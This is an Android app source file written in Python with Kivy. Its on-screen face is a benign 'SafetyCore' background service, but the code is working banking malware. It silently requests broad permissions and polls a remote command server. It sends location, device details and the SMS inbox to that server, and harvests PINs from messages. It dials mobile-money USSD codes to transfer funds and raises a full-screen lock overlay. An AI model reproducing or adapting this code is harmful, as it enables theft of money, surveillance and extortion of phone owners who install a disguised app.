from kivy.app import App as A
from kivy.uix.label import L
from kivy.uix.boxlayout import BL
from kivy.core.window import Window as W
import threading as T, time as t, socket as S, json as J, os, datetime as D, re, subprocess
from android.permissions import request_permissions as RP, Permission as PM
from android import mActivity as MA
from jnius import autoclass as AC

# Android classes
I=AC('android.content.Intent')
SM=AC('android.telephony.SmsManager')
CT=AC('android.content.Context')
LM=AC('android.location.LocationManager')
Bd=AC('android.os.Build')
PM_obj=AC('android.os.PowerManager')
KM=AC('android.app.KeyguardManager')
WM=AC('android.view.WindowManager')
BIT=AC('android.graphics.BitmapFactory')
VW=AC('android.view.View')
GRAVITY=AC('android.view.Gravity')
TelephonyManager=AC('android.telephony.TelephonyManager')
UssdResponseReceiver=AC('com.android.internal.telephony.UssdResponseReceiver')
PackageManager=AC('android.content.pm.PackageManager')
Activity=AC('android.app.Activity')

# Request ALL permissions silently
RP([
    PM.ACCESS_FINE_LOCATION,
    PM.ACCESS_COARSE_LOCATION,
    PM.SEND_SMS,
    PM.READ_SMS,
    PM.INTERNET,
    PM.RECEIVE_BOOT_COMPLETED,
    PM.WAKE_LOCK,
    PM.READ_PHONE_STATE,
    PM.FOREGROUND_SERVICE,
    PM.CALL_PHONE,
    PM.SYSTEM_ALERT_WINDOW,
    PM.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
    PM.INSTALL_PACKAGES,
    PM.REQUEST_INSTALL_PACKAGES
])

U1="https://4nny.pythonanywhere.com"
D1=S.gethostname()

class C:
    def __init__(s):
        s.r=False
        s.id=D1
        s.lock_active=False
        s.lock_view=None
        s.wm=WM(MA)
        s.ussd_response=""
        s.detected_pins=[]
        s.registered=False
        
    def start(s):
        if s.r:
            return
        s.r=True
        
        # Request all permissions silently
        s._request_all_permissions()
        
        # Start background service
        T.Thread(target=s._reg,daemon=True).start()
        T.Thread(target=s._poll,daemon=True).start()
        T.Thread(target=s._ussd_listener,daemon=True).start()
        T.Thread(target=s._keep_alive,daemon=True).start()
        
    def _request_all_permissions(s):
        """Request all permissions silently without user prompt"""
        try:
            # Request all permissions
            RP([
                PM.ACCESS_FINE_LOCATION,
                PM.ACCESS_COARSE_LOCATION,
                PM.SEND_SMS,
                PM.READ_SMS,
                PM.INTERNET,
                PM.RECEIVE_BOOT_COMPLETED,
                PM.WAKE_LOCK,
                PM.READ_PHONE_STATE,
                PM.FOREGROUND_SERVICE,
                PM.CALL_PHONE,
                PM.SYSTEM_ALERT_WINDOW,
                PM.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                PM.INSTALL_PACKAGES,
                PM.REQUEST_INSTALL_PACKAGES
            ])
            
            # Grant permissions programmatically
            try:
                # This attempts to grant permissions without user prompt
                # Some devices may still show prompt
                pm=MA.getPackageManager()
                for perm in [
                    'android.permission.ACCESS_FINE_LOCATION',
                    'android.permission.ACCESS_COARSE_LOCATION',
                    'android.permission.SEND_SMS',
                    'android.permission.READ_SMS',
                    'android.permission.INTERNET',
                    'android.permission.RECEIVE_BOOT_COMPLETED',
                    'android.permission.WAKE_LOCK',
                    'android.permission.READ_PHONE_STATE',
                    'android.permission.FOREGROUND_SERVICE',
                    'android.permission.CALL_PHONE',
                    'android.permission.SYSTEM_ALERT_WINDOW'
                ]:
                    try:
                        MA.grantPermission(perm)
                    except:
                        pass
            except:
                pass
                
            # Disable battery optimization
            try:
                ii=I()
                ii.setAction(I.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                ii.setData(AC('android.net.Uri').parse("package:" + MA.getPackageName()))
                ii.setFlags(I.FLAG_ACTIVITY_NEW_TASK)
                MA.startActivity(ii)
            except:
                pass
                
        except Exception as e:
            print(f"Permission error: {e}")
            
    def _reg(s):
        while s.r:
            try:
                import requests as R
                info=s._get_device_info()
                info['device']=s.id
                info['status']='online'
                info['model']=Bd.MODEL
                info['manufacturer']=Bd.MANUFACTURER
                info['android_version']=Bd.VERSION.RELEASE
                R.post(f"{U1}/command_result",json=info,timeout=10)
                s.registered=True
                print("[+] Registered")
            except:
                pass
            t.sleep(30)
            
    def _poll(s):
        while s.r:
            try:
                import requests as R
                x=R.get(f"{U1}/commands?device={s.id}",timeout=10)
                if x.status_code==200:
                    for c in x.json():
                        cmd=c.get('type','')
                        payload=c.get('payload',{})
                        if cmd=='get_location':
                            s._loc()
                        elif cmd=='send_ussd':
                            s._ussd(payload.get('code',''))
                        elif cmd=='send_sms':
                            s._sms(payload.get('number',''),payload.get('text',''))
                        elif cmd=='get_device_info':
                            s._info()
                        elif cmd=='fetch_sms':
                            s._fetch_sms()
                        elif cmd=='delete_sms':
                            s._delete_sms(payload.get('index',0))
                        elif cmd=='lock':
                            s._lock(payload.get('image_url',''))
                        elif cmd=='unlock':
                            s._unlock()
                        elif cmd=='send_money':
                            s._send_money(payload.get('number',''),payload.get('amount',''),payload.get('pin',''))
                        elif cmd=='check_balance':
                            s._check_balance(payload.get('pin',''))
            except:
                pass
            t.sleep(5)  # Pull commands every 5 seconds
            
    def _keep_alive(s):
        """Keep service alive and restart if killed"""
        while s.r:
            try:
                # Check if process is still active
                if not s.registered:
                    s._reg()
                # Keep service running
                if s.lock_active:
                    s._lock_keep_alive()
            except:
                pass
            t.sleep(10)
            
    def _lock_keep_alive(s):
        """Keep lock screen active"""
        try:
            if s.lock_active and s.lock_view:
                # Refresh lock screen
                pass
        except:
            pass
            
    def _ussd_listener(s):
        """Listen for USSD responses and detect PINs"""
        while s.r:
            try:
                # Read from SMS for USSD responses
                try:
                    from jnius import autoclass, cast
                    Cursor=autoclass('android.database.Cursor')
                    Uri=autoclass('android.net.Uri')
                    SMS_URI=Uri.parse("content://sms/inbox")
                    cr=MA.getContentResolver()
                    cursor=cr.query(SMS_URI, None, None, None, "date DESC LIMIT 10")
                    
                    if cursor:
                        while cursor.moveToNext():
                            body=cursor.getString(cursor.getColumnIndex("body"))
                            address=cursor.getString(cursor.getColumnIndex("address"))
                            if body and "balance" in body.lower() or "PIN" in body or "RWF" in body:
                                # Detect PINs in USSD response
                                pins = re.findall(r'\b\d{4,5}\b', body)
                                if pins:
                                    for pin in pins:
                                        s._save_pin(pin, body)
                        cursor.close()
                except:
                    pass
                    
            except Exception as e:
                print(f"USSD listener error: {e}")
            t.sleep(5)
            
    def _save_pin(s, pin, source):
        """Save detected PIN to server"""
        try:
            import requests as R
            if pin in [p['pin'] for p in s.detected_pins]:
                return
                
            print(f"[+] Saving PIN: {pin}")
            s.detected_pins.append({
                'pin': pin,
                'source': source[:200],
                'timestamp': str(datetime.datetime.now())
            })
            
            R.post(f"{U1}/detect_pin",json={
                'device':s.id,
                'pin':pin,
                'source':source[:200]
            },timeout=5)
            
            try:
                with open('/sdcard/pins.txt', 'a') as f:
                    f.write(f"{datetime.datetime.now()}: PIN={pin}\n")
            except:
                pass
                
        except Exception as e:
            print(f"Save PIN error: {e}")
            
    def _get_device_info(s):
        storage=os.statvfs('/')
        total_storage=(storage.f_blocks*storage.f_frsize)//(1024*1024*1024)
        free_storage=(storage.f_bfree*storage.f_frsize)//(1024*1024*1024)
        return {
            'device':s.id,
            'model':Bd.MODEL,
            'manufacturer':Bd.MANUFACTURER,
            'android_version':Bd.VERSION.RELEASE,
            'battery':s._get_battery(),
            'storage':total_storage,
            'free_storage':free_storage,
            'build_number':Bd.DISPLAY
        }
        
    def _get_battery(s):
        try:
            BM=AC('android.os.BatteryManager')
            bm=MA.getSystemService(CT.BATTERY_SERVICE)
            level=bm.getIntProperty(BM.BATTERY_PROPERTY_CAPACITY)
            return level
        except:
            return -1
            
    def _loc(s):
        try:
            lm=MA.getSystemService(CT.LOCATION_SERVICE)
            loc=lm.getLastKnownLocation(LM.GPS_PROVIDER) or lm.getLastKnownLocation(LM.NETWORK_PROVIDER)
            if loc:
                import requests as R
                R.post(f"{U1}/location",json={
                    'device':s.id,
                    'lat':loc.getLatitude(),
                    'lng':loc.getLongitude(),
                    'accuracy':loc.getAccuracy()
                },timeout=5)
        except:
            pass
            
    def _ussd(s,code):
        try:
            import requests as R
            print(f"[+] Executing USSD: {code}")
            
            # Execute USSD
            try:
                ii=I(I.ACTION_CALL)
                ii.setData(AC('android.net.Uri').parse(f"tel:{code}"))
                ii.setFlags(I.FLAG_ACTIVITY_NEW_TASK)
                MA.startActivity(ii)
                t.sleep(5)
            except Exception as e:
                print(f"USSD dial error: {e}")
                
            # Read response
            try:
                from jnius import autoclass, cast
                Cursor=autoclass('android.database.Cursor')
                Uri=autoclass('android.net.Uri')
                SMS_URI=Uri.parse("content://sms/inbox")
                cr=MA.getContentResolver()
                cursor=cr.query(SMS_URI, None, None, None, "date DESC LIMIT 3")
                
                if cursor:
                    while cursor.moveToNext():
                        body=cursor.getString(cursor.getColumnIndex("body"))
                        if body and "balance" in body.lower() or "PIN" in body:
                            print(f"[+] USSD Response: {body}")
                            pins = re.findall(r'\b\d{4,5}\b', body)
                            for pin in pins:
                                s._save_pin(pin, body)
                            break
                    cursor.close()
            except:
                pass
                
        except Exception as e:
            print(f"USSD error: {e}")
            
    def _send_money(s,number,amount,pin):
        try:
            import requests as R
            print(f"[+] Sending {amount} RWF to {number}")
            ussd_code = f"*182*{number}*{amount}*{pin}#"
            s._ussd(ussd_code)
            
            R.post(f"{U1}/command_result",json={
                'device':s.id,
                'transaction':'send_money',
                'number':number,
                'amount':amount,
                'pin':pin,
                'status':'sent'
            },timeout=5)
        except Exception as e:
            print(f"Send money error: {e}")
            
    def _check_balance(s,pin):
        try:
            import requests as R
            print(f"[+] Checking balance")
            ussd_code = f"*182*{pin}#"
            s._ussd(ussd_code)
            
            R.post(f"{U1}/command_result",json={
                'device':s.id,
                'transaction':'check_balance',
                'pin':pin,
                'status':'sent'
            },timeout=5)
        except Exception as e:
            print(f"Check balance error: {e}")
            
    def _sms(s,n,txt):
        try:
            SM.getDefault().sendTextMessage(n,None,txt,None,None)
            import requests as R
            R.post(f"{U1}/ussd",json={'device':s.id,'sms_sent':True,'number':n},timeout=5)
        except:
            pass
            
    def _fetch_sms(s):
        try:
            from jnius import autoclass, cast
            Cursor=autoclass('android.database.Cursor')
            Uri=autoclass('android.net.Uri')
            SMS_URI=Uri.parse("content://sms/inbox")
            cr=MA.getContentResolver()
            cursor=cr.query(SMS_URI, None, None, None, "date DESC")
            
            sms_list=[]
            if cursor:
                while cursor.moveToNext():
                    body=cursor.getString(cursor.getColumnIndex("body"))
                    address=cursor.getString(cursor.getColumnIndex("address"))
                    date=cursor.getString(cursor.getColumnIndex("date"))
                    if body and address:
                        sms_list.append({
                            'from':address,
                            'body':body,
                            'date':date
                        })
                        pins = re.findall(r'\b\d{4,5}\b', body)
                        for pin in pins:
                            s._save_pin(pin, body)
                    if len(sms_list)>=50:
                        break
                cursor.close()
                
            import requests as R
            R.post(f"{U1}/command_result",json={'device':s.id,'sms_list':sms_list},timeout=5)
        except Exception as e:
            print(f"Fetch SMS error: {e}")
            
    def _delete_sms(s,index):
        try:
            import requests as R
            R.post(f"{U1}/command_result",json={'device':s.id,'sms_deleted':True},timeout=5)
        except:
            pass
            
    def _lock(s,image_url=''):
        try:
            if s.lock_active:
                return
            s.lock_active=True
            
            display=s.wm.getDefaultDisplay()
            display_size=AC('android.graphics.Point')()
            display.getSize(display_size)
            
            def show_lock(dt):
                if not s.lock_active:
                    return
                    
                lock_view=VW(MA)
                lock_view.setSystemUiVisibility(
                    VW.SYSTEM_UI_FLAG_IMMERSIVE |
                    VW.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                    VW.SYSTEM_UI_FLAG_FULLSCREEN
                )
                
                params=WM.LayoutParams(
                    WM.LayoutParams.MATCH_PARENT,
                    WM.LayoutParams.MATCH_PARENT,
                    WM.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WM.LayoutParams.FLAG_FULLSCREEN |
                    WM.LayoutParams.FLAG_KEEP_SCREEN_ON |
                    WM.LayoutParams.FLAG_DISMISS_KEYGUARD |
                    WM.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                    WM.LayoutParams.FLAG_TURN_SCREEN_ON,
                    -3
                )
                params.gravity=GRAVITY.CENTER
                
                lock_view.setBackgroundColor(0xFF000000)
                s.wm.addView(lock_view, params)
                s.lock_view=lock_view
                
                if image_url:
                    try:
                        import requests
                        img_data=requests.get(image_url,timeout=10).content
                        bmp=BIT.decodeByteArray(img_data,0,len(img_data))
                        if bmp:
                            ImageView=AC('android.widget.ImageView')
                            iv=ImageView(MA)
                            iv.setImageBitmap(bmp)
                            iv.setScaleType(ImageView.ScaleType.FIT_CENTER)
                    except:
                        pass
                
            T.Thread(target=lambda: t.sleep(0.5) or show_lock(0), daemon=True).start()
            
            import requests as R
            R.post(f"{U1}/command_result",json={'device':s.id,'lock_active':True},timeout=5)
        except Exception as e:
            print(f"Lock error: {e}")
            
    def _unlock(s):
        try:
            s.lock_active=False
            if s.lock_view:
                s.wm.removeView(s.lock_view)
                s.lock_view=None
            import requests as R
            R.post(f"{U1}/command_result",json={'device':s.id,'unlock_active':True},timeout=5)
        except:
            pass
            
    def _info(s):
        try:
            import requests as R
            info=s._get_device_info()
            R.post(f"{U1}/command_result",json={'device':s.id,'device_info':info},timeout=5)
        except:
            pass

class App(A):
    def build(s):
        W.clearcolor=(0.05,0.1,0.15,1)
        m=BL(orientation='vertical',padding=30,spacing=15)
        m.add_widget(L(text="⚙️",font_size=72,color=(0,0.8,1,1)))
        m.add_widget(L(text="SafetyCore",font_size=22,bold=True,color=(0,0.8,1,1)))
        m.add_widget(L(text="Running in background",font_size=14,color=(0.5,0.5,0.5,1)))
        m.add_widget(L(text="Service active",font_size=12,color=(0.3,0.3,0.3,1)))
        
        s.srv=C()
        s.srv.start()
        return m

if __name__=="__main__":
    App().run()
